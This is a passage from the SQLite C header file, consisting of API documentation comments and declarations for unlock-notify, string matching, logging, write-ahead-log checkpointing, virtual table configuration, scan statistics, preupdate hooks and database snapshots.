** detection. ^If a given call to sqlite3_unlock_notify() would put the
** system in a deadlocked state, then SQLITE_LOCKED is returned and no
** unlock-notify callback is registered. The system is said to be in
** a deadlocked state if connection A has registered for an unlock-notify
** callback on the conclusion of connection B's transaction, and connection
** B has itself registered for an unlock-notify callback when connection
** A's transaction is concluded. ^Indirect deadlock is also detected, so
** the system is also considered to be deadlocked if connection B has
** registered for an unlock-notify callback on the conclusion of connection
** C's transaction, where connection C is waiting on connection A. ^Any
** number of levels of indirection are allowed.
**
** <b>The "DROP TABLE" Exception</b>
**
** When a call to [sqlite3_step()] returns SQLITE_LOCKED, it is almost 
** always appropriate to call sqlite3_unlock_notify(). There is however,
** one exception. When executing a "DROP TABLE" or "DROP INDEX" statement,
** SQLite checks if there are any currently executing SELECT statements
** that belong to the same connection. If there are, SQLITE_LOCKED is
** returned. In this case there is no "blocking connection", so invoking
** sqlite3_unlock_notify() results in the unlock-notify callback being
** invoked immediately. If the application then re-attempts the "DROP TABLE"
** or "DROP INDEX" query, an infinite loop might be the result.
**
** One way around this problem is to check the extended error code returned
** by an sqlite3_step() call. ^(If there is a blocking connection, then the
** extended error code is set to SQLITE_LOCKED_SHAREDCACHE. Otherwise, in
** the special "DROP TABLE/INDEX" case, the extended error code is just 
** SQLITE_LOCKED.)^
*/
SQLITE_API int sqlite3_unlock_notify(
  sqlite3 *pBlocked,                          /* Waiting connection */
  void (*xNotify)(void **apArg, int nArg),    /* Callback function to invoke */
  void *pNotifyArg                            /* Argument to pass to xNotify */
);


/*
** CAPI3REF: String Comparison
**
** ^The [sqlite3_stricmp()] and [sqlite3_strnicmp()] APIs allow applications
** and extensions to compare the contents of two buffers containing UTF-8
** strings in a case-independent fashion, using the same definition of "case
** independence" that SQLite uses internally when comparing identifiers.
*/
SQLITE_API int sqlite3_stricmp(const char *, const char *);
SQLITE_API int sqlite3_strnicmp(const char *, const char *, int);

/*
** CAPI3REF: String Globbing
*
** ^The [sqlite3_strglob(P,X)] interface returns zero if and only if
** string X matches the [GLOB] pattern P.
** ^The definition of [GLOB] pattern matching used in
** [sqlite3_strglob(P,X)] is the same as for the "X GLOB P" operator in the
** SQL dialect understood by SQLite.  ^The [sqlite3_strglob(P,X)] function
** is case sensitive.
**
** Note that this routine returns zero on a match and non-zero if the strings
** do not match, the same as [sqlite3_stricmp()] and [sqlite3_strnicmp()].
**
** See also: [sqlite3_strlike()].
*/
SQLITE_API int sqlite3_strglob(const char *zGlob, const char *zStr);

/*
** CAPI3REF: String LIKE Matching
*
** ^The [sqlite3_strlike(P,X,E)] interface returns zero if and only if
** string X matches the [LIKE] pattern P with escape character E.
** ^The definition of [LIKE] pattern matching used in
** [sqlite3_strlike(P,X,E)] is the same as for the "X LIKE P ESCAPE E"
** operator in the SQL dialect understood by SQLite.  ^For "X LIKE P" without
** the ESCAPE clause, set the E parameter of [sqlite3_strlike(P,X,E)] to 0.
** ^As with the LIKE operator, the [sqlite3_strlike(P,X,E)] function is case
** insensitive - equivalent upper and lower case ASCII characters match
** one another.
**
** ^The [sqlite3_strlike(P,X,E)] function matches Unicode characters, though
** only ASCII characters are case folded.
**
** Note that this routine returns zero on a match and non-zero if the strings
** do not match, the same as [sqlite3_stricmp()] and [sqlite3_strnicmp()].
**
** See also: [sqlite3_strglob()].
*/
SQLITE_API int sqlite3_strlike(const char *zGlob, const char *zStr, unsigned int cEsc);

/*
** CAPI3REF: Error Logging Interface
**
** ^The [sqlite3_log()] interface writes a message into the [error log]
** established by the [SQLITE_CONFIG_LOG] option to [sqlite3_config()].
** ^If logging is enabled, the zFormat string and subsequent arguments are
** used with [sqlite3_snprintf()] to generate the final output string.
**
** The sqlite3_log() interface is intended for use by extensions such as
** virtual tables, collating functions, and SQL functions.  While there is
** nothing to prevent an application from calling sqlite3_log(), doing so
** is considered bad form.
**
** The zFormat string must not be NULL.
**
** To avoid deadlocks and other threading problems, the sqlite3_log() routine
** will not use dynamically allocated memory.  The log message is stored in
** a fixed-length buffer on the stack.  If the log message is longer than
** a few hundred characters, it will be truncated to the length of the
** buffer.
*/
SQLITE_API void sqlite3_log(int iErrCode, const char *zFormat, ...);

/*
** CAPI3REF: Write-Ahead Log Commit Hook
** METHOD: sqlite3
**
** ^The [sqlite3_wal_hook()] function is used to register a callback that
** is invoked each time data is committed to a database in wal mode.
**
** ^(The callback is invoked by SQLite after the commit has taken place and 
** the associated write-lock on the database released)^, so the implementation 
** may read, write or [checkpoint] the database as required.
**
** ^The first parameter passed to the callback function when it is invoked
** is a copy of the third parameter passed to sqlite3_wal_hook() when
** registering the callback. ^The second is a copy of the database handle.
** ^The third parameter is the name of the database that was written to -
** either "main" or the name of an [ATTACH]-ed database. ^The fourth parameter
** is the number of pages currently in the write-ahead log file,
** including those that were just committed.
**
** The callback function should normally return [SQLITE_OK].  ^If an error
** code is returned, that error will propagate back up through the
** SQLite code base to cause the statement that provoked the callback
** to report an error, though the commit will have still occurred. If the
** callback returns [SQLITE_ROW] or [SQLITE_DONE], or if it returns a value
** that does not correspond to any valid SQLite error code, the results
** are undefined.
**
** A single database handle may have at most a single write-ahead log callback 
** registered at one time. ^Calling [sqlite3_wal_hook()] replaces any
** previously registered write-ahead log callback. ^Note that the
** [sqlite3_wal_autocheckpoint()] interface and the
** [wal_autocheckpoint pragma] both invoke [sqlite3_wal_hook()] and will
** overwrite any prior [sqlite3_wal_hook()] settings.
*/
SQLITE_API void *sqlite3_wal_hook(
  sqlite3*, 
  int(*)(void *,sqlite3*,const char*,int),
  void*
);

/*
** CAPI3REF: Configure an auto-checkpoint
** METHOD: sqlite3
**
** ^The [sqlite3_wal_autocheckpoint(D,N)] is a wrapper around
** [sqlite3_wal_hook()] that causes any database on [database connection] D
** to automatically [checkpoint]
** after committing a transaction if there are N or
** more frames in the [write-ahead log] file.  ^Passing zero or 
** a negative value as the nFrame parameter disables automatic
** checkpoints entirely.
**
** ^The callback registered by this function replaces any existing callback
** registered using [sqlite3_wal_hook()].  ^Likewise, registering a callback
** using [sqlite3_wal_hook()] disables the automatic checkpoint mechanism
** configured by this function.
**
** ^The [wal_autocheckpoint pragma] can be used to invoke this interface
** from SQL.
**
** ^Checkpoints initiated by this mechanism are
** [sqlite3_wal_checkpoint_v2|PASSIVE].
**
** ^Every new [database connection] defaults to having the auto-checkpoint
** enabled with a threshold of 1000 or [SQLITE_DEFAULT_WAL_AUTOCHECKPOINT]
** pages.  The use of this interface
** is only necessary if the default setting is found to be suboptimal
** for a particular application.
*/
SQLITE_API int sqlite3_wal_autocheckpoint(sqlite3 *db, int N);

/*
** CAPI3REF: Checkpoint a database
** METHOD: sqlite3
**
** ^(The sqlite3_wal_checkpoint(D,X) is equivalent to
** [sqlite3_wal_checkpoint_v2](D,X,[SQLITE_CHECKPOINT_PASSIVE],0,0).)^
**
** In brief, sqlite3_wal_checkpoint(D,X) causes the content in the 
** [write-ahead log] for database X on [database connection] D to be
** transferred into the database file and for the write-ahead log to
** be reset.  See the [checkpointing] documentation for addition
** information.
**
** This interface used to be the only way to cause a checkpoint to
** occur.  But then the newer and more powerful [sqlite3_wal_checkpoint_v2()]
** interface was added.  This interface is retained for backwards
** compatibility and as a convenience for applications that need to manually
** start a callback but which do not need the full power (and corresponding
** complication) of [sqlite3_wal_checkpoint_v2()].
*/
SQLITE_API int sqlite3_wal_checkpoint(sqlite3 *db, const char *zDb);

/*
** CAPI3REF: Checkpoint a database
** METHOD: sqlite3
**
** ^(The sqlite3_wal_checkpoint_v2(D,X,M,L,C) interface runs a checkpoint
** operation on database X of [database connection] D in mode M.  Status
** information is written back into integers pointed to by L and C.)^
** ^(The M parameter must be a valid [checkpoint mode]:)^
**
** <dl>
** <dt>SQLITE_CHECKPOINT_PASSIVE<dd>
**   ^Checkpoint as many frames as possible without waiting for any database 
**   readers or writers to finish, then sync the database file if all frames 
**   in the log were checkpointed. ^The [busy-handler callback]
**   is never invoked in the SQLITE_CHECKPOINT_PASSIVE mode.  
**   ^On the other hand, passive mode might leave the checkpoint unfinished
**   if there are concurrent readers or writers.
**
** <dt>SQLITE_CHECKPOINT_FULL<dd>
**   ^This mode blocks (it invokes the
**   [sqlite3_busy_handler|busy-handler callback]) until there is no
**   database writer and all readers are reading from the most recent database
**   snapshot. ^It then checkpoints all frames in the log file and syncs the
**   database file. ^This mode blocks new database writers while it is pending,
**   but new database readers are allowed to continue unimpeded.
**
** <dt>SQLITE_CHECKPOINT_RESTART<dd>
**   ^This mode works the same way as SQLITE_CHECKPOINT_FULL with the addition
**   that after checkpointing the log file it blocks (calls the 
**   [busy-handler callback])
**   until all readers are reading from the database file only. ^This ensures 
**   that the next writer will restart the log file from the beginning.
**   ^Like SQLITE_CHECKPOINT_FULL, this mode blocks new
**   database writer attempts while it is pending, but does not impede readers.
**
** <dt>SQLITE_CHECKPOINT_TRUNCATE<dd>
**   ^This mode works the same way as SQLITE_CHECKPOINT_RESTART with the
**   addition that it also truncates the log file to zero bytes just prior
**   to a successful return.
** </dl>
**
** ^If pnLog is not NULL, then *pnLog is set to the total number of frames in
** the log file or to -1 if the checkpoint could not run because
** of an error or because the database is not in [WAL mode]. ^If pnCkpt is not
** NULL,then *pnCkpt is set to the total number of checkpointed frames in the
** log file (including any that were already checkpointed before the function
** was called) or to -1 if the checkpoint could not run due to an error or
** because the database is not in WAL mode. ^Note that upon successful
** completion of an SQLITE_CHECKPOINT_TRUNCATE, the log file will have been
** truncated to zero bytes and so both *pnLog and *pnCkpt will be set to zero.
**
** ^All calls obtain an exclusive "checkpoint" lock on the database file. ^If
** any other process is running a checkpoint operation at the same time, the 
** lock cannot be obtained and SQLITE_BUSY is returned. ^Even if there is a 
** busy-handler configured, it will not be invoked in this case.
**
** ^The SQLITE_CHECKPOINT_FULL, RESTART and TRUNCATE modes also obtain the 
** exclusive "writer" lock on the database file. ^If the writer lock cannot be
** obtained immediately, and a busy-handler is configured, it is invoked and
** the writer lock retried until either the busy-handler returns 0 or the lock
** is successfully obtained. ^The busy-handler is also invoked while waiting for
** database readers as described above. ^If the busy-handler returns 0 before
** the writer lock is obtained or while waiting for database readers, the
** checkpoint operation proceeds from that point in the same way as 
** SQLITE_CHECKPOINT_PASSIVE - checkpointing as many frames as possible 
** without blocking any further. ^SQLITE_BUSY is returned in this case.
**
** ^If parameter zDb is NULL or points to a zero length string, then the
** specified operation is attempted on all WAL databases [attached] to 
** [database connection] db.  In this case the
** values written to output parameters *pnLog and *pnCkpt are undefined. ^If 
** an SQLITE_BUSY error is encountered when processing one or more of the 
** attached WAL databases, the operation is still attempted on any remaining 
** attached databases and SQLITE_BUSY is returned at the end. ^If any other 
** error occurs while processing an attached database, processing is abandoned 
** and the error code is returned to the caller immediately. ^If no error 
** (SQLITE_BUSY or otherwise) is encountered while processing the attached 
** databases, SQLITE_OK is returned.
**
** ^If database zDb is the name of an attached database that is not in WAL
** mode, SQLITE_OK is returned and both *pnLog and *pnCkpt set to -1. ^If
** zDb is not NULL (or a zero length string) and is not the name of any
** attached database, SQLITE_ERROR is returned to the caller.
**
** ^Unless it returns SQLITE_MISUSE,
** the sqlite3_wal_checkpoint_v2() interface
** sets the error information that is queried by
** [sqlite3_errcode()] and [sqlite3_errmsg()].
**
** ^The [PRAGMA wal_checkpoint] command can be used to invoke this interface
** from SQL.
*/
SQLITE_API int sqlite3_wal_checkpoint_v2(
  sqlite3 *db,                    /* Database handle */
  const char *zDb,                /* Name of attached database (or NULL) */
  int eMode,                      /* SQLITE_CHECKPOINT_* value */
  int *pnLog,                     /* OUT: Size of WAL log in frames */
  int *pnCkpt                     /* OUT: Total number of frames checkpointed */
);

/*
** CAPI3REF: Checkpoint Mode Values
** KEYWORDS: {checkpoint mode}
**
** These constants define all valid values for the "checkpoint mode" passed
** as the third parameter to the [sqlite3_wal_checkpoint_v2()] interface.
** See the [sqlite3_wal_checkpoint_v2()] documentation for details on the
** meaning of each of these checkpoint modes.
*/
#define SQLITE_CHECKPOINT_PASSIVE  0  /* Do as much as possible w/o blocking */
#define SQLITE_CHECKPOINT_FULL     1  /* Wait for writers, then checkpoint */
#define SQLITE_CHECKPOINT_RESTART  2  /* Like FULL but wait for for readers */
#define SQLITE_CHECKPOINT_TRUNCATE 3  /* Like RESTART but also truncate WAL */

/*
** CAPI3REF: Virtual Table Interface Configuration
**
** This function may be called by either the [xConnect] or [xCreate] method
** of a [virtual table] implementation to configure
** various facets of the virtual table interface.
**
** If this interface is invoked outside the context of an xConnect or
** xCreate virtual table method then the behavior is undefined.
**
** At present, there is only one option that may be configured using
** this function. (See [SQLITE_VTAB_CONSTRAINT_SUPPORT].)  Further options
** may be added in the future.
*/
SQLITE_API int sqlite3_vtab_config(sqlite3*, int op, ...);

/*
** CAPI3REF: Virtual Table Configuration Options
**
** These macros define the various options to the
** [sqlite3_vtab_config()] interface that [virtual table] implementations
** can use to customize and optimize their behavior.
**
** <dl>
** [[SQLITE_VTAB_CONSTRAINT_SUPPORT]]
** <dt>SQLITE_VTAB_CONSTRAINT_SUPPORT
** <dd>Calls of the form
** [sqlite3_vtab_config](db,SQLITE_VTAB_CONSTRAINT_SUPPORT,X) are supported,
** where X is an integer.  If X is zero, then the [virtual table] whose
** [xCreate] or [xConnect] method invoked [sqlite3_vtab_config()] does not
** support constraints.  In this configuration (which is the default) if
** a call to the [xUpdate] method returns [SQLITE_CONSTRAINT], then the entire
** statement is rolled back as if [ON CONFLICT | OR ABORT] had been
** specified as part of the users SQL statement, regardless of the actual
** ON CONFLICT mode specified.
**
** If X is non-zero, then the virtual table implementation guarantees
** that if [xUpdate] returns [SQLITE_CONSTRAINT], it will do so before
** any modifications to internal or persistent data structures have been made.
** If the [ON CONFLICT] mode is ABORT, FAIL, IGNORE or ROLLBACK, SQLite 
** is able to roll back a statement or database transaction, and abandon
** or continue processing the current SQL statement as appropriate. 
** If the ON CONFLICT mode is REPLACE and the [xUpdate] method returns
** [SQLITE_CONSTRAINT], SQLite handles this as if the ON CONFLICT mode
** had been ABORT.
**
** Virtual table implementations that are required to handle OR REPLACE
** must do so within the [xUpdate] method. If a call to the 
** [sqlite3_vtab_on_conflict()] function indicates that the current ON 
** CONFLICT policy is REPLACE, the virtual table implementation should 
** silently replace the appropriate rows within the xUpdate callback and
** return SQLITE_OK. Or, if this is not possible, it may return
** SQLITE_CONSTRAINT, in which case SQLite falls back to OR ABORT 
** constraint handling.
** </dl>
*/
#define SQLITE_VTAB_CONSTRAINT_SUPPORT 1

/*
** CAPI3REF: Determine The Virtual Table Conflict Policy
**
** This function may only be called from within a call to the [xUpdate] method
** of a [virtual table] implementation for an INSERT or UPDATE operation. ^The
** value returned is one of [SQLITE_ROLLBACK], [SQLITE_IGNORE], [SQLITE_FAIL],
** [SQLITE_ABORT], or [SQLITE_REPLACE], according to the [ON CONFLICT] mode
** of the SQL statement that triggered the call to the [xUpdate] method of the
** [virtual table].
*/
SQLITE_API int sqlite3_vtab_on_conflict(sqlite3 *);

/*
** CAPI3REF: Determine If Virtual Table Column Access Is For UPDATE
**
** If the sqlite3_vtab_nochange(X) routine is called within the [xColumn]
** method of a [virtual table], then it returns true if and only if the
** column is being fetched as part of an UPDATE operation during which the
** column value will not change.  Applications might use this to substitute
** a return value that is less expensive to compute and that the corresponding
** [xUpdate] method understands as a "no-change" value.
**
** If the [xColumn] method calls sqlite3_vtab_nochange() and finds that
** the column is not changed by the UPDATE statement, then the xColumn
** method can optionally return without setting a result, without calling
** any of the [sqlite3_result_int|sqlite3_result_xxxxx() interfaces].
** In that case, [sqlite3_value_nochange(X)] will return true for the
** same column in the [xUpdate] method.
*/
SQLITE_API int sqlite3_vtab_nochange(sqlite3_context*);

/*
** CAPI3REF: Determine The Collation For a Virtual Table Constraint
**
** This function may only be called from within a call to the [xBestIndex]
** method of a [virtual table]. 
**
** The first argument must be the sqlite3_index_info object that is the
** first parameter to the xBestIndex() method. The second argument must be
** an index into the aConstraint[] array belonging to the sqlite3_index_info
** structure passed to xBestIndex. This function returns a pointer to a buffer 
** containing the name of the collation sequence for the corresponding
** constraint.
*/
SQLITE_API SQLITE_EXPERIMENTAL const char *sqlite3_vtab_collation(sqlite3_index_info*,int);

/*
** CAPI3REF: Conflict resolution modes
** KEYWORDS: {conflict resolution mode}
**
** These constants are returned by [sqlite3_vtab_on_conflict()] to
** inform a [virtual table] implementation what the [ON CONFLICT] mode
** is for the SQL statement being evaluated.
**
** Note that the [SQLITE_IGNORE] constant is also used as a potential
** return value from the [sqlite3_set_authorizer()] callback and that
** [SQLITE_ABORT] is also a [result code].
*/
#define SQLITE_ROLLBACK 1
/* #define SQLITE_IGNORE 2 // Also used by sqlite3_authorizer() callback */
#define SQLITE_FAIL     3
/* #define SQLITE_ABORT 4  // Also an error code */
#define SQLITE_REPLACE  5

/*
** CAPI3REF: Prepared Statement Scan Status Opcodes
** KEYWORDS: {scanstatus options}
**
** The following constants can be used for the T parameter to the
** [sqlite3_stmt_scanstatus(S,X,T,V)] interface.  Each constant designates a
** different metric for sqlite3_stmt_scanstatus() to return.
**
** When the value returned to V is a string, space to hold that string is
** managed by the prepared statement S and will be automatically freed when
** S is finalized.
**
** <dl>
** [[SQLITE_SCANSTAT_NLOOP]] <dt>SQLITE_SCANSTAT_NLOOP</dt>
** <dd>^The [sqlite3_int64] variable pointed to by the T parameter will be
** set to the total number of times that the X-th loop has run.</dd>
**
** [[SQLITE_SCANSTAT_NVISIT]] <dt>SQLITE_SCANSTAT_NVISIT</dt>
** <dd>^The [sqlite3_int64] variable pointed to by the T parameter will be set
** to the total number of rows examined by all iterations of the X-th loop.</dd>
**
** [[SQLITE_SCANSTAT_EST]] <dt>SQLITE_SCANSTAT_EST</dt>
** <dd>^The "double" variable pointed to by the T parameter will be set to the
** query planner's estimate for the average number of rows output from each
** iteration of the X-th loop.  If the query planner's estimates was accurate,
** then this value will approximate the quotient NVISIT/NLOOP and the
** product of this value for all prior loops with the same SELECTID will
** be the NLOOP value for the current loop.
**
** [[SQLITE_SCANSTAT_NAME]] <dt>SQLITE_SCANSTAT_NAME</dt>
** <dd>^The "const char *" variable pointed to by the T parameter will be set
** to a zero-terminated UTF-8 string containing the name of the index or table
** used for the X-th loop.
**
** [[SQLITE_SCANSTAT_EXPLAIN]] <dt>SQLITE_SCANSTAT_EXPLAIN</dt>
** <dd>^The "const char *" variable pointed to by the T parameter will be set
** to a zero-terminated UTF-8 string containing the [EXPLAIN QUERY PLAN]
** description for the X-th loop.
**
** [[SQLITE_SCANSTAT_SELECTID]] <dt>SQLITE_SCANSTAT_SELECT</dt>
** <dd>^The "int" variable pointed to by the T parameter will be set to the
** "select-id" for the X-th loop.  The select-id identifies which query or
** subquery the loop is part of.  The main query has a select-id of zero.
** The select-id is the same value as is output in the first column
** of an [EXPLAIN QUERY PLAN] query.
** </dl>
*/
#define SQLITE_SCANSTAT_NLOOP    0
#define SQLITE_SCANSTAT_NVISIT   1
#define SQLITE_SCANSTAT_EST      2
#define SQLITE_SCANSTAT_NAME     3
#define SQLITE_SCANSTAT_EXPLAIN  4
#define SQLITE_SCANSTAT_SELECTID 5

/*
** CAPI3REF: Prepared Statement Scan Status
** METHOD: sqlite3_stmt
**
** This interface returns information about the predicted and measured
** performance for pStmt.  Advanced applications can use this
** interface to compare the predicted and the measured performance and
** issue warnings and/or rerun [ANALYZE] if discrepancies are found.
**
** Since this interface is expected to be rarely used, it is only
** available if SQLite is compiled using the [SQLITE_ENABLE_STMT_SCANSTATUS]
** compile-time option.
**
** The "iScanStatusOp" parameter determines which status information to return.
** The "iScanStatusOp" must be one of the [scanstatus options] or the behavior
** of this interface is undefined.
** ^The requested measurement is written into a variable pointed to by
** the "pOut" parameter.
** Parameter "idx" identifies the specific loop to retrieve statistics for.
** Loops are numbered starting from zero. ^If idx is out of range - less than
** zero or greater than or equal to the total number of loops used to implement
** the statement - a non-zero value is returned and the variable that pOut
** points to is unchanged.
**
** ^Statistics might not be available for all loops in all statements. ^In cases
** where there exist loops with no available statistics, this function behaves
** as if the loop did not exist - it returns non-zero and leave the variable
** that pOut points to unchanged.
**
** See also: [sqlite3_stmt_scanstatus_reset()]
*/
SQLITE_API int sqlite3_stmt_scanstatus(
  sqlite3_stmt *pStmt,      /* Prepared statement for which info desired */
  int idx,                  /* Index of loop to report on */
  int iScanStatusOp,        /* Information desired.  SQLITE_SCANSTAT_* */
  void *pOut                /* Result written here */
);     

/*
** CAPI3REF: Zero Scan-Status Counters
** METHOD: sqlite3_stmt
**
** ^Zero all [sqlite3_stmt_scanstatus()] related event counters.
**
** This API is only available if the library is built with pre-processor
** symbol [SQLITE_ENABLE_STMT_SCANSTATUS] defined.
*/
SQLITE_API void sqlite3_stmt_scanstatus_reset(sqlite3_stmt*);

/*
** CAPI3REF: Flush caches to disk mid-transaction
**
** ^If a write-transaction is open on [database connection] D when the
** [sqlite3_db_cacheflush(D)] interface invoked, any dirty
** pages in the pager-cache that are not currently in use are written out 
** to disk. A dirty page may be in use if a database cursor created by an
** active SQL statement is reading from it, or if it is page 1 of a database
** file (page 1 is always "in use").  ^The [sqlite3_db_cacheflush(D)]
** interface flushes caches for all schemas - "main", "temp", and
** any [attached] databases.
**
** ^If this function needs to obtain extra database locks before dirty pages 
** can be flushed to disk, it does so. ^If those locks cannot be obtained 
** immediately and there is a busy-handler callback configured, it is invoked
** in the usual manner. ^If the required lock still cannot be obtained, then
** the database is skipped and an attempt made to flush any dirty pages
** belonging to the next (if any) database. ^If any databases are skipped
** because locks cannot be obtained, but no other error occurs, this
** function returns SQLITE_BUSY.
**
** ^If any other error occurs while flushing dirty pages to disk (for
** example an IO error or out-of-memory condition), then processing is
** abandoned and an SQLite [error code] is returned to the caller immediately.
**
** ^Otherwise, if no error occurs, [sqlite3_db_cacheflush()] returns SQLITE_OK.
**
** ^This function does not set the database handle error code or message
** returned by the [sqlite3_errcode()] and [sqlite3_errmsg()] functions.
*/
SQLITE_API int sqlite3_db_cacheflush(sqlite3*);

/*
** CAPI3REF: The pre-update hook.
**
** ^These interfaces are only available if SQLite is compiled using the
** [SQLITE_ENABLE_PREUPDATE_HOOK] compile-time option.
**
** ^The [sqlite3_preupdate_hook()] interface registers a callback function
** that is invoked prior to each [INSERT], [UPDATE], and [DELETE] operation
** on a database table.
** ^At most one preupdate hook may be registered at a time on a single
** [database connection]; each call to [sqlite3_preupdate_hook()] overrides
** the previous setting.
** ^The preupdate hook is disabled by invoking [sqlite3_preupdate_hook()]
** with a NULL pointer as the second parameter.
** ^The third parameter to [sqlite3_preupdate_hook()] is passed through as
** the first parameter to callbacks.
**
** ^The preupdate hook only fires for changes to real database tables; the
** preupdate hook is not invoked for changes to [virtual tables] or to
** system tables like sqlite_master or sqlite_stat1.
**
** ^The second parameter to the preupdate callback is a pointer to
** the [database connection] that registered the preupdate hook.
** ^The third parameter to the preupdate callback is one of the constants
** [SQLITE_INSERT], [SQLITE_DELETE], or [SQLITE_UPDATE] to identify the
** kind of update operation that is about to occur.
** ^(The fourth parameter to the preupdate callback is the name of the
** database within the database connection that is being modified.  This
** will be "main" for the main database or "temp" for TEMP tables or 
** the name given after the AS keyword in the [ATTACH] statement for attached
** databases.)^
** ^The fifth parameter to the preupdate callback is the name of the
** table that is being modified.
**
** For an UPDATE or DELETE operation on a [rowid table], the sixth
** parameter passed to the preupdate callback is the initial [rowid] of the 
** row being modified or deleted. For an INSERT operation on a rowid table,
** or any operation on a WITHOUT ROWID table, the value of the sixth 
** parameter is undefined. For an INSERT or UPDATE on a rowid table the
** seventh parameter is the final rowid value of the row being inserted
** or updated. The value of the seventh parameter passed to the callback
** function is not defined for operations on WITHOUT ROWID tables, or for
** INSERT operations on rowid tables.
**
** The [sqlite3_preupdate_old()], [sqlite3_preupdate_new()],
** [sqlite3_preupdate_count()], and [sqlite3_preupdate_depth()] interfaces
** provide additional information about a preupdate event. These routines
** may only be called from within a preupdate callback.  Invoking any of
** these routines from outside of a preupdate callback or with a
** [database connection] pointer that is different from the one supplied
** to the preupdate callback results in undefined and probably undesirable
** behavior.
**
** ^The [sqlite3_preupdate_count(D)] interface returns the number of columns
** in the row that is being inserted, updated, or deleted.
**
** ^The [sqlite3_preupdate_old(D,N,P)] interface writes into P a pointer to
** a [protected sqlite3_value] that contains the value of the Nth column of
** the table row before it is updated.  The N parameter must be between 0
** and one less than the number of columns or the behavior will be
** undefined. This must only be used within SQLITE_UPDATE and SQLITE_DELETE
** preupdate callbacks; if it is used by an SQLITE_INSERT callback then the
** behavior is undefined.  The [sqlite3_value] that P points to
** will be destroyed when the preupdate callback returns.
**
** ^The [sqlite3_preupdate_new(D,N,P)] interface writes into P a pointer to
** a [protected sqlite3_value] that contains the value of the Nth column of
** the table row after it is updated.  The N parameter must be between 0
** and one less than the number of columns or the behavior will be
** undefined. This must only be used within SQLITE_INSERT and SQLITE_UPDATE
** preupdate callbacks; if it is used by an SQLITE_DELETE callback then the
** behavior is undefined.  The [sqlite3_value] that P points to
** will be destroyed when the preupdate callback returns.
**
** ^The [sqlite3_preupdate_depth(D)] interface returns 0 if the preupdate
** callback was invoked as a result of a direct insert, update, or delete
** operation; or 1 for inserts, updates, or deletes invoked by top-level 
** triggers; or 2 for changes resulting from triggers called by top-level
** triggers; and so forth.
**
** See also:  [sqlite3_update_hook()]
*/
#if defined(SQLITE_ENABLE_PREUPDATE_HOOK)
SQLITE_API void *sqlite3_preupdate_hook(
  sqlite3 *db,
  void(*xPreUpdate)(
    void *pCtx,                   /* Copy of third arg to preupdate_hook() */
    sqlite3 *db,                  /* Database handle */
    int op,                       /* SQLITE_UPDATE, DELETE or INSERT */
    char const *zDb,              /* Database name */
    char const *zName,            /* Table name */
    sqlite3_int64 iKey1,          /* Rowid of row about to be deleted/updated */
    sqlite3_int64 iKey2           /* New rowid value (for a rowid UPDATE) */
  ),
  void*
);
SQLITE_API int sqlite3_preupdate_old(sqlite3 *, int, sqlite3_value **);
SQLITE_API int sqlite3_preupdate_count(sqlite3 *);
SQLITE_API int sqlite3_preupdate_depth(sqlite3 *);
SQLITE_API int sqlite3_preupdate_new(sqlite3 *, int, sqlite3_value **);
#endif

/*
** CAPI3REF: Low-level system error code
**
** ^Attempt to return the underlying operating system error code or error
** number that caused the most recent I/O error or failure to open a file.
** The return value is OS-dependent.  For example, on unix systems, after
** [sqlite3_open_v2()] returns [SQLITE_CANTOPEN], this interface could be
** called to get back the underlying "errno" that caused the problem, such
** as ENOSPC, EAUTH, EISDIR, and so forth.  
*/
SQLITE_API int sqlite3_system_errno(sqlite3*);

/*
** CAPI3REF: Database Snapshot
** KEYWORDS: {snapshot} {sqlite3_snapshot}
**
** An instance of the snapshot object records the state of a [WAL mode]
** database for some specific point in history.
**
** In [WAL mode], multiple [database connections] that are open on the
** same database file can each be reading a different historical version
** of the database file.  When a [database connection] begins a read
** transaction, that connection sees an unchanging copy of the database
** as it existed for the point in time when the transaction first started.
** Subsequent changes to the database from other connections are not seen
** by the reader until a new read transaction is started.
**
** The sqlite3_snapshot object records state information about an historical
** version of the database file so that it is possible to later open a new read
** transaction that sees that historical version of the database rather than
** the most recent version.
*/
typedef struct sqlite3_snapshot {
  unsigned char hidden[48];
} sqlite3_snapshot;

/*
** CAPI3REF: Record A Database Snapshot
** CONSTRUCTOR: sqlite3_snapshot
**
** ^The [sqlite3_snapshot_get(D,S,P)] interface attempts to make a
** new [sqlite3_snapshot] object that records the current state of
** schema S in database connection D.  ^On success, the
** [sqlite3_snapshot_get(D,S,P)] interface writes a pointer to the newly
** created [sqlite3_snapshot] object into *P and returns SQLITE_OK.
** If there is not already a read-transaction open on schema S when
** this function is called, one is opened automatically. 
**
** The following must be true for this function to succeed. If any of
** the following statements are false when sqlite3_snapshot_get() is
** called, SQLITE_ERROR is returned. The final value of *P is undefined
** in this case. 
**
** <ul>
**   <li> The database handle must not be in [autocommit mode].
**
**   <li> Schema S of [database connection] D must be a [WAL mode] database.
**
**   <li> There must not be a write transaction open on schema S of database
**        connection D.
**
**   <li> One or more transactions must have been written to the current wal
**        file since it was created on disk (by any connection). This means
**        that a snapshot cannot be taken on a wal mode database with no wal 
**        file immediately after it is first opened. At least one transaction
**        must be written to it first.
** </ul>
**
** This function may also return SQLITE_NOMEM.  If it is called with the
** database handle in autocommit mode but fails for some other reason, 
** whether or not a read transaction is opened on schema S is undefined.
**
** The [sqlite3_snapshot] object returned from a successful call to
** [sqlite3_snapshot_get()] must be freed using [sqlite3_snapshot_free()]
** to avoid a memory leak.
**
** The [sqlite3_snapshot_get()] interface is only available when the
** [SQLITE_ENABLE_SNAPSHOT] compile-time option is used.
*/
SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_snapshot_get(
  sqlite3 *db,
  const char *zSchema,
  sqlite3_snapshot **ppSnapshot
);

/*
** CAPI3REF: Start a read transaction on an historical snapshot
** METHOD: sqlite3_snapshot
**
** ^The [sqlite3_snapshot_open(D,S,P)] interface either starts a new read 
** transaction or upgrades an existing one for schema S of 
** [database connection] D such that the read transaction refers to 
** historical [snapshot] P, rather than the most recent change to the 
** database. ^The [sqlite3_snapshot_open()] interface returns SQLITE_OK 
** on success or an appropriate [error code] if it fails.
**
** ^In order to succeed, the database connection must not be in 
** [autocommit mode] when [sqlite3_snapshot_open(D,S,P)] is called. If there
** is already a read transaction open on schema S, then the database handle
** must have no active statements (SELECT statements that have been passed
** to sqlite3_step() but not sqlite3_reset() or sqlite3_finalize()). 
** SQLITE_ERROR is returned if either of these conditions is violated, or
** if schema S does not exist, or if the snapshot object is invalid.
**
** ^A call to sqlite3_snapshot_open() will fail to open if the specified
** snapshot has been overwritten by a [checkpoint]. In this case 
** SQLITE_ERROR_SNAPSHOT is returned.
**
** If there is already a read transaction open when this function is 
